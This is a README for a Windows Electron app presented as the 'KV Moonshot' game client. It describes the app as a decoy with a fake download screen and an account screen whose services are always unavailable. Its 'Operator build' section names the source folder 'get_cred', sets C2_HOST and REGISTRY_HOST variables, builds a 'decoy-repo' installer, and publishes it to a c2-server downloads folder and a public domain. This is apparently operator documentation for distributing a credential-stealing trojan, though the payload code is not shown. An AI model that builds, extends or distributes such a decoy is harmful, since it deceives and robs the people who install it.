# KV Moonshot desktop (Windows portable)

Electron shell for the **game client**: fake download UI, account screen, then local static marketing site (`game-site/`). Native bootstrap matches `npm install` postinstall.

## Operator build

All sources live in **`get_cred`** (not a separate trial-sdk folder on disk):

```bash
cd /path/to/get_cred
C2_HOST=… REGISTRY_HOST=… npm run build-decoy   # site + dist/decoy-repo + portable exe
# or after decoy exists:
npm run build-game-exe
```

Output: `dist/decoy-repo/dist/desktop/KVMoonShot-Setup-<ver>-win-x64.exe`  
Published to `c2-server/site/downloads/` and kvmoonshot.cc.

Branding icons: `node scripts/prepare-desktop-branding.mjs` (from `templates/game-client`, uses `monitor/assets/`).

## Dev smoke test

From `dist/decoy-repo` after overlay:

```bash
npm install --include=dev
npm run desktop:dev
```

## End-user flow

1. Run **KVMoonShot-Setup-…-win-x64.exe**
2. Download progress + tips → sign-in (online services unavailable) → optional offline hangar (marketing site in-window)
